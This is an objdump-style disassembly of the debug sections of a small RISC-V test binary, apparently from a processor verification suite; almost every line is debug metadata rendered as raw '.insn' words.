 738:	1f98                	.insn	2, 0x1f98
 73a:	0000                	.insn	2, 0x
 73c:	0068                	.insn	2, 0x0068
 73e:	0000                	.insn	2, 0x
 740:	ff01                	.insn	2, 0xff01
 742:	0001                	.insn	2, 0x0001
 744:	0200                	.insn	2, 0x0200
 746:	124d                	.insn	2, 0x124d
 748:	00aa                	.insn	2, 0x00aa
 74a:	0000                	.insn	2, 0x
 74c:	9102                	.insn	2, 0x9102
 74e:	075c                	.insn	2, 0x075c
 750:	1fb4                	.insn	2, 0x1fb4
 752:	0000                	.insn	2, 0x
 754:	004c                	.insn	2, 0x004c
 756:	0000                	.insn	2, 0x
 758:	02006a03          	.insn	4, 0x02006a03
 75c:	1650                	.insn	2, 0x1650
 75e:	00aa                	.insn	2, 0x00aa
 760:	0000                	.insn	2, 0x
 762:	9102                	.insn	2, 0x9102
 764:	0764                	.insn	2, 0x0764
 766:	1fbc                	.insn	2, 0x1fbc
 768:	0000                	.insn	2, 0x
 76a:	002c                	.insn	2, 0x002c
 76c:	0000                	.insn	2, 0x
 76e:	3b01                	.insn	2, 0x3b01
 770:	0002                	.insn	2, 0x0002
 772:	0200                	.insn	2, 0x0200
 774:	00aa1653          	fadd.s	fa2,fs4,fa0,rtz
 778:	0000                	.insn	2, 0x
 77a:	9102                	.insn	2, 0x9102
 77c:	0058                	.insn	2, 0x0058
 77e:	0000                	.insn	2, 0x
 780:	0000                	.insn	2, 0x
 782:	6e0e                	.insn	2, 0x6e0e
 784:	5d000003          	lb	zero,1488(zero) # 5d0 <_start-0xa30>
 788:	1ee8                	.insn	2, 0x1ee8
 78a:	0000                	.insn	2, 0x
 78c:	0044                	.insn	2, 0x0044
 78e:	0000                	.insn	2, 0x
 790:	9c01                	.insn	2, 0x9c01
 792:	05b1                	.insn	2, 0x05b1
 794:	0000                	.insn	2, 0x
 796:	760d                	.insn	2, 0x760d
 798:	6c61                	.insn	2, 0x6c61
 79a:	5d00                	.insn	2, 0x5d00
 79c:	0000bb1b          	.insn	4, 0xbb1b
 7a0:	0200                	.insn	2, 0x0200
 7a2:	5f91                	.insn	2, 0x5f91
 7a4:	f801                	.insn	2, 0xf801
 7a6:	01000003          	lb	zero,16(zero) # 10 <_start-0xff0>
 7aa:	145f 0113 0000      	.insn	6, 0x0113145f
 7b0:	9102                	.insn	2, 0x9102
 7b2:	006c                	.insn	2, 0x006c
 7b4:	860e                	.insn	2, 0x860e
 7b6:	3c000003          	lb	zero,960(zero) # 3c0 <_start-0xc40>
 7ba:	1cc8                	.insn	2, 0x1cc8
 7bc:	0000                	.insn	2, 0x
 7be:	0220                	.insn	2, 0x0220
 7c0:	0000                	.insn	2, 0x
 7c2:	9c01                	.insn	2, 0x9c01
 7c4:	060d                	.insn	2, 0x060d
 7c6:	0000                	.insn	2, 0x
 7c8:	760d                	.insn	2, 0x760d
 7ca:	6c61                	.insn	2, 0x6c61
 7cc:	3c00                	.insn	2, 0x3c00
 7ce:	7619                	.insn	2, 0x7619
 7d0:	0000                	.insn	2, 0x
 7d2:	0300                	.insn	2, 0x0300
 7d4:	bc91                	.insn	2, 0xbc91
 7d6:	017f 03f8 0000 3e01 	.insn	10, 0x0d133e01000003f8017f
 7de:	0d13 
 7e0:	0006                	.insn	2, 0x0006
 7e2:	0200                	.insn	2, 0x0200
 7e4:	6491                	.insn	2, 0x6491
 7e6:	01006903          	.insn	4, 0x01006903
 7ea:	0940                	.insn	2, 0x0940
 7ec:	0076                	.insn	2, 0x0076
 7ee:	0000                	.insn	2, 0x
 7f0:	9102                	.insn	2, 0x9102
 7f2:	036c                	.insn	2, 0x036c
 7f4:	41010063          	beq	sp,a6,bf4 <_start-0x40c>
 7f8:	1209                	.insn	2, 0x1209
 7fa:	0006                	.insn	2, 0x0006
 7fc:	0200                	.insn	2, 0x0200
 7fe:	4491                	.insn	2, 0x4491
 800:	746e6303          	.insn	4, 0x746e6303
 804:	0100                	.insn	2, 0x0100
 806:	0942                	.insn	2, 0x0942
 808:	0076                	.insn	2, 0x0076
 80a:	0000                	.insn	2, 0x
 80c:	9102                	.insn	2, 0x9102
 80e:	0068                	.insn	2, 0x0068
 810:	7d08                	.insn	2, 0x7d08
 812:	0000                	.insn	2, 0x
 814:	0600                	.insn	2, 0x0600
 816:	0076                	.insn	2, 0x0076
 818:	0000                	.insn	2, 0x
 81a:	0622                	.insn	2, 0x0622
 81c:	0000                	.insn	2, 0x
 81e:	820a                	.insn	2, 0x820a
 820:	0000                	.insn	2, 0x
 822:	0700                	.insn	2, 0x0700
 824:	0e00                	.insn	2, 0x0e00
 826:	00000357          	.insn	4, 0x0357
 82a:	b81c                	.insn	2, 0xb81c
 82c:	1000001b          	.insn	4, 0x1000001b
 830:	0001                	.insn	2, 0x0001
 832:	0100                	.insn	2, 0x0100
 834:	8e9c                	.insn	2, 0x8e9c
 836:	0006                	.insn	2, 0x0006
 838:	0d00                	.insn	2, 0x0d00
 83a:	6176                	.insn	2, 0x6176
 83c:	006c                	.insn	2, 0x006c
 83e:	191c                	.insn	2, 0x191c
 840:	0076                	.insn	2, 0x0076
 842:	0000                	.insn	2, 0x
 844:	77dc9103          	lh	sp,1917(s9)
 848:	f801                	.insn	2, 0xf801
 84a:	01000003          	lb	zero,16(zero) # 10 <_start-0xff0>
 84e:	131e                	.insn	2, 0x131e
 850:	060d                	.insn	2, 0x060d
 852:	0000                	.insn	2, 0x
 854:	9102                	.insn	2, 0x9102
 856:	0360                	.insn	2, 0x0360
 858:	0069                	.insn	2, 0x0069
 85a:	2001                	.insn	2, 0x2001
 85c:	7609                	.insn	2, 0x7609
 85e:	0000                	.insn	2, 0x
 860:	0200                	.insn	2, 0x0200
 862:	6c91                	.insn	2, 0x6c91
 864:	01006303          	.insn	4, 0x01006303
 868:	0921                	.insn	2, 0x0921
 86a:	068e                	.insn	2, 0x068e
 86c:	0000                	.insn	2, 0x
 86e:	77e09103          	lh	sp,1918(ra) # 77e <_start-0x882>
 872:	746e6303          	.insn	4, 0x746e6303
 876:	0100                	.insn	2, 0x0100
 878:	0922                	.insn	2, 0x0922
 87a:	0076                	.insn	2, 0x0076
 87c:	0000                	.insn	2, 0x
 87e:	9102                	.insn	2, 0x9102
 880:	0168                	.insn	2, 0x0168
 882:	042e                	.insn	2, 0x042e
 884:	0000                	.insn	2, 0x
 886:	2301                	.insn	2, 0x2301
 888:	7609                	.insn	2, 0x7609
 88a:	0000                	.insn	2, 0x
 88c:	0200                	.insn	2, 0x0200
 88e:	6491                	.insn	2, 0x6491
 890:	0600                	.insn	2, 0x0600
 892:	0076                	.insn	2, 0x0076
 894:	0000                	.insn	2, 0x
 896:	069e                	.insn	2, 0x069e
 898:	0000                	.insn	2, 0x
 89a:	820a                	.insn	2, 0x820a
 89c:	0000                	.insn	2, 0x
 89e:	ff00                	.insn	2, 0xff00
 8a0:	1800                	.insn	2, 0x1800
 8a2:	0475                	.insn	2, 0x0475
 8a4:	0000                	.insn	2, 0x
 8a6:	1301                	.insn	2, 0x1301
 8a8:	9c06                	.insn	2, 0x9c06
 8aa:	1c00001b          	.insn	4, 0x1c00001b
 8ae:	0000                	.insn	2, 0x
 8b0:	0100                	.insn	2, 0x0100
 8b2:	199c                	.insn	2, 0x199c
 8b4:	0106                	.insn	2, 0x0106
 8b6:	0000                	.insn	2, 0x
 8b8:	0b01                	.insn	2, 0x0b01
 8ba:	00009c1b          	.insn	4, 0x9c1b
 8be:	2000                	.insn	2, 0x2000
 8c0:	7c00001b          	.insn	4, 0x7c00001b
 8c4:	0000                	.insn	2, 0x
 8c6:	0100                	.insn	2, 0x0100
 8c8:	2a9c                	.insn	2, 0x2a9c
 8ca:	04000007          	.insn	4, 0x04000007
 8ce:	00c0                	.insn	2, 0x00c0
 8d0:	0000                	.insn	2, 0x
 8d2:	0b01                	.insn	2, 0x0b01
 8d4:	9c28                	.insn	2, 0x9c28
 8d6:	0000                	.insn	2, 0x
 8d8:	0200                	.insn	2, 0x0200
 8da:	5c91                	.insn	2, 0x5c91
 8dc:	7a04                	.insn	2, 0x7a04
 8de:	0000                	.insn	2, 0x
 8e0:	0100                	.insn	2, 0x0100
 8e2:	072a3b0b          	.insn	4, 0x072a3b0b
 8e6:	0000                	.insn	2, 0x
 8e8:	9102                	.insn	2, 0x9102
 8ea:	0d58                	.insn	2, 0x0d58
 8ec:	006e                	.insn	2, 0x006e
 8ee:	0089480b          	.insn	4, 0x0089480b
 8f2:	0000                	.insn	2, 0x
 8f4:	9102                	.insn	2, 0x9102
 8f6:	0154                	.insn	2, 0x0154
 8f8:	00b2                	.insn	2, 0x00b2
 8fa:	0000                	.insn	2, 0x
 8fc:	0d01                	.insn	2, 0x0d01
 8fe:	b609                	.insn	2, 0xb609
 900:	0000                	.insn	2, 0x
 902:	0200                	.insn	2, 0x0200
 904:	6891                	.insn	2, 0x6891
 906:	63727303          	.insn	4, 0x63727303
 90a:	0100                	.insn	2, 0x0100
 90c:	0f0e                	.insn	2, 0x0f0e
 90e:	0730                	.insn	2, 0x0730
 910:	0000                	.insn	2, 0x
 912:	9102                	.insn	2, 0x9102
 914:	0764                	.insn	2, 0x0764
 916:	1b48                	.insn	2, 0x1b48
 918:	0000                	.insn	2, 0x
 91a:	0040                	.insn	2, 0x0040
 91c:	0000                	.insn	2, 0x
 91e:	01006903          	.insn	4, 0x01006903
 922:	00890f0f          	.insn	4, 0x00890f0f
 926:	0000                	.insn	2, 0x
 928:	9102                	.insn	2, 0x9102
 92a:	006c                	.insn	2, 0x006c
 92c:	0800                	.insn	2, 0x0800
 92e:	0000072f          	.insn	4, 0x072f
 932:	081a                	.insn	2, 0x081a
 934:	000000c7          	fmsub.s	ft1,ft0,ft0,ft0,rne
	...

Disassembly of section .debug_abbrev:

00000000 <.debug_abbrev>:
   0:	1101                	.insn	2, 0x1101
   2:	1000                	.insn	2, 0x1000
   4:	12011117          	auipc	sp,0x12011
   8:	1b0e030f          	.insn	4, 0x1b0e030f
   c:	250e                	.insn	2, 0x250e
   e:	130e                	.insn	2, 0x130e
  10:	0005                	.insn	2, 0x0005
  12:	0000                	.insn	2, 0x
  14:	2401                	.insn	2, 0x2401
  16:	0b00                	.insn	2, 0x0b00
  18:	030b3e0b          	.insn	4, 0x030b3e0b
  1c:	000e                	.insn	2, 0x000e
  1e:	0200                	.insn	2, 0x0200
  20:	0034                	.insn	2, 0x0034
  22:	213a0e03          	lb	t3,531(s4)
  26:	3b01                	.insn	2, 0x3b01
  28:	0c21390b          	.insn	4, 0x0c21390b
  2c:	1349                	.insn	2, 0x1349
  2e:	193c193f 34030000 	.insn	8, 0x34030000193c193f
  36:	0300                	.insn	2, 0x0300
  38:	3a08                	.insn	2, 0x3a08
  3a:	0121                	.insn	2, 0x0121
  3c:	0b390b3b          	.insn	4, 0x0b390b3b
  40:	1349                	.insn	2, 0x1349
  42:	1802                	.insn	2, 0x1802
  44:	0000                	.insn	2, 0x
  46:	3404                	.insn	2, 0x3404
  48:	0300                	.insn	2, 0x0300
  4a:	3a0e                	.insn	2, 0x3a0e
  4c:	0121                	.insn	2, 0x0121
  4e:	0b390b3b          	.insn	4, 0x0b390b3b
  52:	1349                	.insn	2, 0x1349
  54:	1802                	.insn	2, 0x1802
  56:	0000                	.insn	2, 0x
  58:	0505                	.insn	2, 0x0505
  5a:	0300                	.insn	2, 0x0300
  5c:	3a0e                	.insn	2, 0x3a0e
  5e:	0121                	.insn	2, 0x0121
  60:	0b390b3b          	.insn	4, 0x0b390b3b
  64:	1349                	.insn	2, 0x1349
  66:	1802                	.insn	2, 0x1802
  68:	0000                	.insn	2, 0x
  6a:	0506                	.insn	2, 0x0506
  6c:	0300                	.insn	2, 0x0300
  6e:	3a08                	.insn	2, 0x3a08
  70:	0121                	.insn	2, 0x0121
  72:	0b390b3b          	.insn	4, 0x0b390b3b
  76:	1349                	.insn	2, 0x1349
  78:	1802                	.insn	2, 0x1802
  7a:	0000                	.insn	2, 0x
  7c:	0b000f07          	.insn	4, 0x0b000f07
  80:	0421                	.insn	2, 0x0421
  82:	1349                	.insn	2, 0x1349
  84:	0000                	.insn	2, 0x
  86:	1608                	.insn	2, 0x1608
  88:	0300                	.insn	2, 0x0300
  8a:	3a0e                	.insn	2, 0x3a0e
  8c:	390b3b0b          	.insn	4, 0x390b3b0b
  90:	0013490b          	.insn	4, 0x0013490b
  94:	0900                	.insn	2, 0x0900
  96:	012e                	.insn	2, 0x012e
  98:	213a0e03          	lb	t3,531(s4)
  9c:	3b01                	.insn	2, 0x3b01
  9e:	0e21390b          	.insn	4, 0x0e21390b
  a2:	13491927          	.insn	4, 0x13491927
  a6:	0111                	.insn	2, 0x0111
  a8:	0612                	.insn	2, 0x0612
  aa:	1840                	.insn	2, 0x1840
  ac:	197a                	.insn	2, 0x197a
  ae:	1301                	.insn	2, 0x1301
  b0:	0000                	.insn	2, 0x
  b2:	0b0a                	.insn	2, 0x0b0a
  b4:	1101                	.insn	2, 0x1101
  b6:	1201                	.insn	2, 0x1201
  b8:	0006                	.insn	2, 0x0006
  ba:	0b00                	.insn	2, 0x0b00
  bc:	0111                	.insn	2, 0x0111
  be:	0e25                	.insn	2, 0x0e25
  c0:	1f030b13          	addi	s6,t1,496
  c4:	01111f1b          	.insn	4, 0x01111f1b
  c8:	0612                	.insn	2, 0x0612
  ca:	1710                	.insn	2, 0x1710
  cc:	0000                	.insn	2, 0x
  ce:	260c                	.insn	2, 0x260c
  d0:	4900                	.insn	2, 0x4900
  d2:	0d000013          	li	zero,208
  d6:	0024                	.insn	2, 0x0024
  d8:	0b3e0b0b          	.insn	4, 0x0b3e0b0b
  dc:	00000803          	lb	a6,0(zero) # 0 <_start-0x1000>
  e0:	2e0e                	.insn	2, 0x2e0e
  e2:	3f01                	.insn	2, 0x3f01
  e4:	0319                	.insn	2, 0x0319
  e6:	3a0e                	.insn	2, 0x3a0e
  e8:	390b3b0b          	.insn	4, 0x390b3b0b
  ec:	1201110b          	.insn	4, 0x1201110b
  f0:	4006                	.insn	2, 0x4006
  f2:	7c18                	.insn	2, 0x7c18
  f4:	0119                	.insn	2, 0x0119
  f6:	0f000013          	li	zero,240
  fa:	0b0b000f          	.insn	4, 0x0b0b000f
  fe:	0000                	.insn	2, 0x
 100:	2610                	.insn	2, 0x2610
 102:	0000                	.insn	2, 0x
 104:	0000                	.insn	2, 0x
 106:	3401                	.insn	2, 0x3401
 108:	0300                	.insn	2, 0x0300
 10a:	3a0e                	.insn	2, 0x3a0e
 10c:	390b3b0b          	.insn	4, 0x390b3b0b
 110:	0213490b          	.insn	4, 0x0213490b
 114:	0018                	.insn	2, 0x0018
 116:	0200                	.insn	2, 0x0200
 118:	0034                	.insn	2, 0x0034
 11a:	0b3a0e03          	lb	t3,179(s4)
 11e:	0b390b3b          	.insn	4, 0x0b390b3b
 122:	1349                	.insn	2, 0x1349
 124:	1802193f 34030000 	.insn	8, 0x340300001802193f
 12c:	0300                	.insn	2, 0x0300
 12e:	3a08                	.insn	2, 0x3a08
 130:	390b3b0b          	.insn	4, 0x390b3b0b
 134:	0213490b          	.insn	4, 0x0213490b
 138:	0018                	.insn	2, 0x0018
 13a:	0400                	.insn	2, 0x0400
 13c:	0005                	.insn	2, 0x0005
 13e:	0b3a0e03          	lb	t3,179(s4)
 142:	0b390b3b          	.insn	4, 0x0b390b3b
 146:	1349                	.insn	2, 0x1349
 148:	1802                	.insn	2, 0x1802
 14a:	0000                	.insn	2, 0x
 14c:	2405                	.insn	2, 0x2405
 14e:	0b00                	.insn	2, 0x0b00
 150:	030b3e0b          	.insn	4, 0x030b3e0b
 154:	000e                	.insn	2, 0x000e
 156:	0600                	.insn	2, 0x0600
 158:	0101                	.insn	2, 0x0101
 15a:	1349                	.insn	2, 0x1349
 15c:	1301                	.insn	2, 0x1301
 15e:	0000                	.insn	2, 0x
 160:	11010b07          	.insn	4, 0x11010b07
 164:	1201                	.insn	2, 0x1201
 166:	0006                	.insn	2, 0x0006
 168:	0800                	.insn	2, 0x0800
 16a:	210b000f          	.insn	4, 0x210b000f
 16e:	4904                	.insn	2, 0x4904
 170:	09000013          	li	zero,144
 174:	012e                	.insn	2, 0x012e
 176:	0e03193f 0b3b0b3a 	.insn	8, 0x0b3b0b3a0e03193f
 17e:	2139                	.insn	2, 0x2139
 180:	2706                	.insn	2, 0x2706
 182:	1119                	.insn	2, 0x1119
 184:	1201                	.insn	2, 0x1201
 186:	4006                	.insn	2, 0x4006
 188:	7a18                	.insn	2, 0x7a18
 18a:	0119                	.insn	2, 0x0119
 18c:	0a000013          	li	zero,160
 190:	0021                	.insn	2, 0x0021
 192:	1349                	.insn	2, 0x1349
 194:	00000b2f          	.insn	4, 0x0b2f
 198:	0300160b          	.insn	4, 0x0300160b
 19c:	3a0e                	.insn	2, 0x3a0e
 19e:	390b3b0b          	.insn	4, 0x390b3b0b
 1a2:	0013490b          	.insn	4, 0x0013490b
 1a6:	0c00                	.insn	2, 0x0c00
 1a8:	0111010b          	.insn	4, 0x0111010b
 1ac:	0612                	.insn	2, 0x0612
 1ae:	1301                	.insn	2, 0x1301
 1b0:	0000                	.insn	2, 0x
 1b2:	050d                	.insn	2, 0x050d
 1b4:	0300                	.insn	2, 0x0300
 1b6:	3a08                	.insn	2, 0x3a08
 1b8:	0121                	.insn	2, 0x0121
 1ba:	0b390b3b          	.insn	4, 0x0b390b3b
 1be:	1349                	.insn	2, 0x1349
 1c0:	1802                	.insn	2, 0x1802
 1c2:	0000                	.insn	2, 0x
 1c4:	2e0e                	.insn	2, 0x2e0e
 1c6:	3f01                	.insn	2, 0x3f01
 1c8:	0319                	.insn	2, 0x0319
 1ca:	3a0e                	.insn	2, 0x3a0e
 1cc:	0121                	.insn	2, 0x0121
 1ce:	21390b3b          	.insn	4, 0x21390b3b
 1d2:	2706                	.insn	2, 0x2706
 1d4:	1119                	.insn	2, 0x1119
 1d6:	1201                	.insn	2, 0x1201
 1d8:	4006                	.insn	2, 0x4006
 1da:	7c18                	.insn	2, 0x7c18
 1dc:	0119                	.insn	2, 0x0119
 1de:	0f000013          	li	zero,240
 1e2:	0035                	.insn	2, 0x0035
 1e4:	1349                	.insn	2, 0x1349
 1e6:	0000                	.insn	2, 0x
 1e8:	2110                	.insn	2, 0x2110
 1ea:	4900                	.insn	2, 0x4900
 1ec:	00052f13          	slti	t5,a0,0
 1f0:	1100                	.insn	2, 0x1100
 1f2:	0111                	.insn	2, 0x0111
 1f4:	0e25                	.insn	2, 0x0e25
 1f6:	1f030b13          	addi	s6,t1,496
 1fa:	01111f1b          	.insn	4, 0x01111f1b
 1fe:	0612                	.insn	2, 0x0612
 200:	1710                	.insn	2, 0x1710
 202:	0000                	.insn	2, 0x
 204:	2412                	.insn	2, 0x2412
 206:	0b00                	.insn	2, 0x0b00
 208:	030b3e0b          	.insn	4, 0x030b3e0b
 20c:	0008                	.insn	2, 0x0008
 20e:	1300                	.insn	2, 0x1300
 210:	0b0b000f          	.insn	4, 0x0b0b000f
 214:	0000                	.insn	2, 0x
 216:	2614                	.insn	2, 0x2614
 218:	4900                	.insn	2, 0x4900
 21a:	15000013          	li	zero,336
 21e:	0115                	.insn	2, 0x0115
 220:	13011927          	.insn	4, 0x13011927
 224:	0000                	.insn	2, 0x
 226:	0516                	.insn	2, 0x0516
 228:	4900                	.insn	2, 0x4900
 22a:	17000013          	li	zero,368
 22e:	012e                	.insn	2, 0x012e
 230:	0e03193f 0b3b0b3a 	.insn	8, 0x0b3b0b3a0e03193f
 238:	0b39                	.insn	2, 0x0b39
 23a:	0111                	.insn	2, 0x0111
 23c:	0612                	.insn	2, 0x0612
 23e:	1840                	.insn	2, 0x1840
 240:	197c                	.insn	2, 0x197c
 242:	1301                	.insn	2, 0x1301
 244:	0000                	.insn	2, 0x
 246:	2e18                	.insn	2, 0x2e18
 248:	3f00                	.insn	2, 0x3f00
 24a:	0319                	.insn	2, 0x0319
 24c:	3a0e                	.insn	2, 0x3a0e
 24e:	390b3b0b          	.insn	4, 0x390b3b0b
 252:	1201110b          	.insn	4, 0x1201110b
 256:	4006                	.insn	2, 0x4006
 258:	7a18                	.insn	2, 0x7a18
 25a:	0019                	.insn	2, 0x0019
 25c:	1900                	.insn	2, 0x1900
 25e:	012e                	.insn	2, 0x012e
 260:	0e03193f 0b3b0b3a 	.insn	8, 0x0b3b0b3a0e03193f
 268:	0b39                	.insn	2, 0x0b39
 26a:	13491927          	.insn	4, 0x13491927
 26e:	0111                	.insn	2, 0x0111
 270:	0612                	.insn	2, 0x0612
 272:	1840                	.insn	2, 0x1840
 274:	197a                	.insn	2, 0x197a
 276:	1301                	.insn	2, 0x1301
 278:	0000                	.insn	2, 0x
 27a:	261a                	.insn	2, 0x261a
 27c:	0000                	.insn	2, 0x
	...

Disassembly of section .debug_aranges:

00000000 <.debug_aranges>:
   0:	001c                	.insn	2, 0x001c
   2:	0000                	.insn	2, 0x
   4:	0002                	.insn	2, 0x0002
   6:	0000                	.insn	2, 0x
   8:	0000                	.insn	2, 0x
   a:	0004                	.insn	2, 0x0004
   c:	0000                	.insn	2, 0x
   e:	0000                	.insn	2, 0x
  10:	1000                	.insn	2, 0x1000
  12:	0000                	.insn	2, 0x
  14:	09b8                	.insn	2, 0x09b8
	...
  1e:	0000                	.insn	2, 0x
  20:	001c                	.insn	2, 0x001c
  22:	0000                	.insn	2, 0x
  24:	0002                	.insn	2, 0x0002
  26:	0025                	.insn	2, 0x0025
  28:	0000                	.insn	2, 0x
  2a:	0004                	.insn	2, 0x0004
  2c:	0000                	.insn	2, 0x
  2e:	0000                	.insn	2, 0x
  30:	19bc                	.insn	2, 0x19bc
  32:	0000                	.insn	2, 0x
  34:	0164                	.insn	2, 0x0164
	...
  3e:	0000                	.insn	2, 0x
  40:	001c                	.insn	2, 0x001c
  42:	0000                	.insn	2, 0x
  44:	0002                	.insn	2, 0x0002
  46:	00000203          	lb	tp,0(zero) # 0 <_start-0x1000>
  4a:	0004                	.insn	2, 0x0004
  4c:	0000                	.insn	2, 0x
  4e:	0000                	.insn	2, 0x
  50:	1b20                	.insn	2, 0x1b20
  52:	0000                	.insn	2, 0x
  54:	0fe0                	.insn	2, 0x0fe0
	...

Disassembly of section .debug_str:

00000000 <.debug_str>:
   0:	7372                	.insn	2, 0x7372
   2:	2d64                	.insn	2, 0x2d64
   4:	2e747263          	bgeu	s0,t2,2e8 <_start-0xd18>
   8:	722f0073          	.insn	4, 0x722f0073
   c:	6d2d6473          	csrrsi	s0,0x6d2,26
  10:	502f646f          	jal	s0,f6512 <__rodata_end+0xf3a0c>
  14:	6f72                	.insn	2, 0x6f72
  16:	73736563          	bltu	t1,s7,740 <_start-0x8c0>
  1a:	532f726f          	jal	tp,f754c <__rodata_end+0xf4a46>
  1e:	6372                	.insn	2, 0x6372
  20:	7265562f          	.insn	4, 0x7265562f
  24:	6669                	.insn	2, 0x6669
  26:	6369                	.insn	2, 0x6369
  28:	7461                	.insn	2, 0x7461
  2a:	6f69                	.insn	2, 0x6f69
  2c:	2f6e                	.insn	2, 0x2f6e
  2e:	6554                	.insn	2, 0x6554
  30:	6f437473          	csrrci	s0,0x6f4,6
  34:	6564                	.insn	2, 0x6564
  36:	722f432f          	.insn	4, 0x722f432f
  3a:	612d6473          	csrrsi	s0,0x612,26
  3e:	7474                	.insn	2, 0x7474
  40:	6361                	.insn	2, 0x6361
  42:	4700736b          	.insn	4, 0x4700736b
  46:	554e                	.insn	2, 0x554e
  48:	4120                	.insn	2, 0x4120
  4a:	2e322053          	.insn	4, 0x2e322053
  4e:	3234                	.insn	2, 0x3234
  50:	7300                	.insn	2, 0x7300
  52:	7a69                	.insn	2, 0x7a69
  54:	5f65                	.insn	2, 0x5f65
  56:	0074                	.insn	2, 0x0074
  58:	5f5f 6164 6174      	.insn	6, 0x617461645f5f
  5e:	655f 646e 5f00      	.insn	6, 0x5f00646e655f
  64:	725f 646f 7461      	.insn	6, 0x7461646f725f
  6a:	5f61                	.insn	2, 0x5f61
  6c:	6e65                	.insn	2, 0x6e65
  6e:	0064                	.insn	2, 0x0064
  70:	6164                	.insn	2, 0x6164
  72:	6174                	.insn	2, 0x6174
  74:	735f 7a69 0065      	.insn	6, 0x00657a69735f
  7a:	5f637273          	csrrci	tp,0x5f6,6
  7e:	7500                	.insn	2, 0x7500
  80:	736e                	.insn	2, 0x736e
  82:	6769                	.insn	2, 0x6769
  84:	656e                	.insn	2, 0x656e
  86:	2064                	.insn	2, 0x2064
  88:	72616863          	bltu	sp,t1,7b8 <_start-0x848>
  8c:	7300                	.insn	2, 0x7300
  8e:	6f68                	.insn	2, 0x6f68
  90:	7472                	.insn	2, 0x7472
  92:	7520                	.insn	2, 0x7520
  94:	736e                	.insn	2, 0x736e
  96:	6769                	.insn	2, 0x6769
  98:	656e                	.insn	2, 0x656e
  9a:	2064                	.insn	2, 0x2064
  9c:	6e69                	.insn	2, 0x6e69
  9e:	0074                	.insn	2, 0x0074
  a0:	6c5f 616f 0064      	.insn	6, 0x0064616f6c5f
  a6:	725f 6473 6d5f      	.insn	6, 0x6d5f6473725f
  ac:	6d65                	.insn	2, 0x6d65
  ae:	00746573          	csrrsi	a0,0x7,8
  b2:	6564                	.insn	2, 0x6564
  b4:	62007473          	csrrci	s0,0x620,0
  b8:	735f7373          	csrrci	t1,mhpmevent21h,30
  bc:	7a69                	.insn	2, 0x7a69
  be:	0065                	.insn	2, 0x0065
  c0:	6564                	.insn	2, 0x6564
  c2:	005f7473          	csrrci	s0,utvec,30
  c6:	5f5f 7362 5f73      	.insn	6, 0x5f7373625f5f
  cc:	72617473          	csrrci	s0,mhpmevent6h,2
  d0:	0074                	.insn	2, 0x0074
  d2:	6f6c                	.insn	2, 0x6f6c
  d4:	676e                	.insn	2, 0x676e
  d6:	6c20                	.insn	2, 0x6c20
  d8:	20676e6f          	jal	t3,762de <__rodata_end+0x737d8>
  dc:	6e75                	.insn	2, 0x6e75
  de:	6e676973          	csrrsi	s2,0x6e6,14
  e2:	6465                	.insn	2, 0x6465
  e4:	6920                	.insn	2, 0x6920
  e6:	746e                	.insn	2, 0x746e
  e8:	5f00                	.insn	2, 0x5f00
  ea:	625f 7373 655f      	.insn	6, 0x655f7373625f
  f0:	646e                	.insn	2, 0x646e
  f2:	6c00                	.insn	2, 0x6c00
  f4:	20676e6f          	jal	t3,762fa <__rodata_end+0x737f4>
  f8:	6f6c                	.insn	2, 0x6f6c
  fa:	676e                	.insn	2, 0x676e
  fc:	6920                	.insn	2, 0x6920
  fe:	746e                	.insn	2, 0x746e
 100:	5f00                	.insn	2, 0x5f00
 102:	7372                	.insn	2, 0x7372
 104:	5f64                	.insn	2, 0x5f64
 106:	656d                	.insn	2, 0x656d
 108:	636d                	.insn	2, 0x636d
 10a:	7970                	.insn	2, 0x7970
 10c:	7300                	.insn	2, 0x7300
 10e:	6f68                	.insn	2, 0x6f68
 110:	7472                	.insn	2, 0x7472
 112:	6920                	.insn	2, 0x6920
 114:	746e                	.insn	2, 0x746e
 116:	5f00                	.insn	2, 0x5f00
 118:	645f 7461 5f61      	.insn	6, 0x5f617461645f
 11e:	72617473          	csrrci	s0,mhpmevent6h,2
 122:	0074                	.insn	2, 0x0074
 124:	5f727473          	csrrci	s0,0x5f7,4
 128:	4700                	.insn	2, 0x4700
 12a:	554e                	.insn	2, 0x554e
 12c:	4320                	.insn	2, 0x4320
 12e:	3731                	.insn	2, 0x3731
 130:	3120                	.insn	2, 0x3120
 132:	2e322e33          	.insn	4, 0x2e322e33
 136:	2030                	.insn	2, 0x2030
 138:	6d2d                	.insn	2, 0x6d2d
 13a:	69727473          	csrrci	s0,0x697,4
 13e:	612d7463          	bgeu	s10,s2,746 <_start-0x8ba>
 142:	696c                	.insn	2, 0x696c
 144:	2d206e67          	.insn	4, 0x2d206e67
 148:	616d                	.insn	2, 0x616d
 14a:	6962                	.insn	2, 0x6962
 14c:	693d                	.insn	2, 0x693d
 14e:	706c                	.insn	2, 0x706c
 150:	20663233          	.insn	4, 0x20663233
 154:	6d2d                	.insn	2, 0x6d2d
 156:	7574                	.insn	2, 0x7574
 158:	656e                	.insn	2, 0x656e
 15a:	723d                	.insn	2, 0x723d
 15c:	656b636f          	jal	t1,b67b2 <__rodata_end+0xb3cac>
 160:	2074                	.insn	2, 0x2074
 162:	6d2d                	.insn	2, 0x6d2d
 164:	7369                	.insn	2, 0x7369
 166:	2d61                	.insn	2, 0x2d61
 168:	63657073          	csrci	0x636,10
 16c:	323d                	.insn	2, 0x323d
 16e:	3130                	.insn	2, 0x3130
 170:	3139                	.insn	2, 0x3139
 172:	3132                	.insn	2, 0x3132
 174:	6d2d2033          	.insn	4, 0x6d2d2033
 178:	7261                	.insn	2, 0x7261
 17a:	723d6863          	bltu	s10,gp,8aa <_start-0x756>
 17e:	3376                	.insn	2, 0x3376
 180:	6932                	.insn	2, 0x6932
 182:	666d                	.insn	2, 0x666d
 184:	7a5f 6369 7273      	.insn	6, 0x727363697a5f
 18a:	2d20                	.insn	2, 0x2d20
 18c:	4f2d2067          	.insn	4, 0x4f2d2067
 190:	2030                	.insn	2, 0x2030
 192:	662d                	.insn	2, 0x662d
 194:	6f6e                	.insn	2, 0x6f6e
 196:	732d                	.insn	2, 0x732d
 198:	6174                	.insn	2, 0x6174
 19a:	702d6b63          	bltu	s10,sp,8b0 <_start-0x750>
 19e:	6f72                	.insn	2, 0x6f72
 1a0:	6574                	.insn	2, 0x6574
 1a2:	726f7463          	bgeu	t5,t1,8ca <_start-0x736>
 1a6:	2d20                	.insn	2, 0x2d20
 1a8:	6e66                	.insn	2, 0x6e66
 1aa:	657a2d6f          	jal	s10,a3000 <__rodata_end+0xa04fa>
 1ae:	6f72                	.insn	2, 0x6f72
